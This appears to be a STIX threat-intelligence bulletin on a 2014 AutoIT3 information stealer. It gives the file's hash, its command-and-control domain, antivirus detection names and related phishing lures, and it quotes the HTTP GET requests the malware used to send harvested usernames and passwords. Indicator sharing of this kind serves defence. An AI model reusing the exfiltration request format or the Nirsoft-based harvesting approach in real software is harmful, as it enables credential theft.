stix:STIX_Header.stix:Title: Information Stealing Malware Submitted for Analysis
stix:STIX_Header.stix:Description:
On 7 January 2014, the malicious file New_Order.PI.009.exe (MD5: 12c84c6910ecdc4f60f266e6851bc586) was submitted for analysis. It was identified as an information stealing malware that sends user names and passwords for email and social media sites to http://orlandmart.com/xob/index.php.
This IB references US-CERT Malware Initial Findings Report MIFR-337635, 30 January 2014.

stix:Indicator.indicator:Description:
The submitted artifact is an AutoIT3 compiled executable. It is a password stealer that harvests user account information stored within the user's browser (e.g., Firefox, Internet Explorer, Chrome, Opera, or Safari) and email client (e.g., Outlook, Yahoo, Gmail, and others). The password recovery components are provided by Nirsoft's WebBrowserPassView and MailPassView tools; available as free downloads from http://www.nirsoft.net/password_recovery_tools.html.
The malware submits passwords recovered from the compromised system in clear-text (URL econded) as HTTP GET requests to domain orlandmart.com. The malware submits a single GET request for each password harvested from the system.
Antivirus Detection: Kaspersky Trojan PSW.Win32.Chisburg.egb McAfee Artemis!12C84C6910EC Microsoft HackTool:Win32/Mailpassview Symantec Trojan.Zbot TrendMicro HKTL_MAILPASSVIEW

The following sample GET requests were sent by the malware. They contained user names and passwords for facebook and yahoo accounts.
GET /xob/index.php?action=add&username=[USERNAME]&password=[PASSWORD]&app=Firefox%203.5/4&pcname=VICTIM&sitename=http://www.facebook.com HTTP/1.1 User-Agent: HardCore Software For : Public Host: orlandmart.com
GET /xob/index.php?action=add&username=[USERNAME]&password=[PASSWORD]&app=Firefox%203.5/4&pcname=VICTIM&sitename=http://www.yahoo.com HTTP/1.1 User-Agent: HardCore Software For : Public Host: orlandmart.com
The domain orlandmart.com was previously received by a US Government Department in two similar phishing incidents on 15 and 31 December 2013. The email on 15 December 2013 included the subject "Payroll Invoice (85,000 Euros)" and the attachment Payment Order.zip. The email on 31 December 2013 included the subject "PAYMENT REMINDER" and the attachment PAYMENT ORDER.zip.
